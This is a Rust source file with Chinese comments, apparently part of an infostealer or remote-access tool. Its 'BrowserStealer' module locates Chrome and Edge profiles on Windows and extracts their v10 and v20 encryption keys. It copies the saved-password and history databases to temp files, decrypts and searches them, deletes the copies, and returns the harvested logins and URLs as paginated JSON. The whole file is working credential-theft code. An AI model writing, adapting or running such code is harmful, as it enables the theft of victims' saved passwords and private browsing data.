// browser_ffi 为 Windows-only（DPAPI/进程 FFI），其余平台不编译该模块。
#[cfg(target_os = "windows")]
mod browser_crypto;
#[cfg(target_os = "windows")]
pub(crate) mod browser_ffi;
#[cfg(target_os = "windows")]
mod browser_sqlite;

pub struct BrowserStealer;

impl BrowserStealer {
    pub fn collect(browser_type: &str, offset: usize, limit: usize) -> String {
        #[cfg(target_os = "windows")]
        {
            Self::collect_windows(browser_type, offset, limit)
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = (browser_type, offset, limit);
            r#"{"total":0,"offset":0,"limit":0,"items":[]}"#.to_string()
        }
    }

    pub fn search(browser_type: &str, keyword: &str) -> String {
        #[cfg(target_os = "windows")]
        {
            Self::search_windows(browser_type, keyword)
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = (browser_type, keyword);
            r#"{"total":0,"items":[]}"#.to_string()
        }
    }

    #[cfg(target_os = "windows")]
    fn search_windows(browser_type: &str, keyword: &str) -> String {
        let local_appdata = dirs_local_appdata();
        let keyword_lower = keyword.to_lowercase();

        let browsers: &[(&str, &str)] = match browser_type {
            "chrome" => &[("Chrome", r"Google\Chrome\User Data")],
            "edge" => &[("Edge", r"Microsoft\Edge\User Data")],
            _ => &[
                ("Chrome", r"Google\Chrome\User Data"),
                ("Edge", r"Microsoft\Edge\User Data"),
            ],
        };

        let mut matched = Vec::new();

        for (name, rel_path) in browsers {
            let user_data = format!(r"{}\{}", local_appdata, rel_path);
            let p = std::path::Path::new(&user_data);
            if !p.exists() { continue; }

            let ls_path = p.join("Local State");
            let v10_key = browser_crypto::extract_v10_key(&ls_path);
            let v20_key = browser_crypto::extract_v20_key(&ls_path);

            let default = p.join("Default");

            // Search passwords
            let login_db = default.join("Login Data");
            if login_db.exists() {
                let tmp = copy_to_temp(&login_db);
                if let Some(ref tmp_path) = tmp {
                    browser_sqlite::search_logins(name, tmp_path, &v10_key, &v20_key, &keyword_lower, &mut matched);
                    let _ = std::fs::remove_file(tmp_path);
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }

            // Search history
            let hist_db = default.join("History");
            if hist_db.exists() {
                let tmp = copy_to_temp(&hist_db);
                if let Some(ref tmp_path) = tmp {
                    browser_sqlite::search_history(name, tmp_path, &keyword_lower, &mut matched);
                    let _ = std::fs::remove_file(tmp_path);
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }
        }

        let total = matched.len();
        format!(
            r#"{{"total":{},"items":[{}]}}"#,
            total,
            matched.join(",")
        )
    }

    #[cfg(target_os = "windows")]
    fn collect_windows(browser_type: &str, offset: usize, limit: usize) -> String {
        let local_appdata = dirs_local_appdata();

        let browsers: &[(&str, &str)] = match browser_type {
            "chrome" => &[("Chrome", r"Google\Chrome\User Data")],
            "edge" => &[("Edge", r"Microsoft\Edge\User Data")],
            _ => &[
                ("Chrome", r"Google\Chrome\User Data"),
                ("Edge", r"Microsoft\Edge\User Data"),
            ],
        };

        let mut all_items = Vec::new();

        for (name, rel_path) in browsers {
            let user_data = format!(r"{}\{}", local_appdata, rel_path);
            let p = std::path::Path::new(&user_data);
            if !p.exists() {
                continue;
            }

            let ls_path = p.join("Local State");
            let v10_key = browser_crypto::extract_v10_key(&ls_path);
            let v20_key = browser_crypto::extract_v20_key(&ls_path);

            let default = p.join("Default");

            // Passwords
            let login_db = default.join("Login Data");
            if login_db.exists() {
                let tmp = copy_to_temp(&login_db);
                if let Some(ref tmp_path) = tmp {
                    browser_sqlite::read_logins(name, tmp_path, &v10_key, &v20_key, &mut all_items);
                    let _ = std::fs::remove_file(tmp_path);
                    // Clean WAL/SHM
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }

            // History
            let hist_db = default.join("History");
            if hist_db.exists() {
                let tmp = copy_to_temp(&hist_db);
                if let Some(ref tmp_path) = tmp {
                    browser_sqlite::read_history(name, tmp_path, &mut all_items);
                    let _ = std::fs::remove_file(tmp_path);
                    for ext in &["-wal", "-shm"] {
                        let _ = std::fs::remove_file(format!("{}{}", tmp_path, ext));
                    }
                }
            }
        }

        let total = all_items.len();
        let items: Vec<_> = all_items.into_iter().skip(offset).take(if limit == 0 { 100 } else { limit }).collect();
        format!(
            r#"{{"total":{},"offset":{},"limit":{},"items":[{}]}}"#,
            total,
            offset,
            limit,
            items.join(",")
        )
    }
}

// ── Helpers ────────────────────────────────────────────────────────────────

pub(super) fn dirs_local_appdata() -> String {
    std::env::var("LOCALAPPDATA").unwrap_or_else(|_| {
        let home = std::env::var("USERPROFILE").unwrap_or_default();
        format!(r"{}\AppData\Local", home)
    })
}

pub(super) fn base64_decode(s: &str) -> Option<Vec<u8>> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.decode(s).ok()
}

pub(super) fn copy_to_temp(path: &std::path::Path) -> Option<String> {
    use std::io::{Read, Write};
    let tmp_name = format!("{}\\bd_{}.db", std::env::temp_dir().to_string_lossy(), uuid::Uuid::new_v4().simple());
    let mut src = std::fs::File::open(path).ok()?;
    let mut buf = Vec::new();
    src.read_to_end(&mut buf).ok()?;
    let mut dst = std::fs::File::create(&tmp_name).ok()?;
    dst.write_all(&buf).ok()?;

    // Copy WAL/SHM if present
    for ext in &["-wal", "-shm"] {
        let wal_path = format!("{}{}", path.to_string_lossy(), ext);
        if std::path::Path::new(&wal_path).exists() {
            let _ = std::fs::copy(&wal_path, format!("{}{}", tmp_name, ext));
        }
    }
    Some(tmp_name)
}

pub(super) fn escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
}
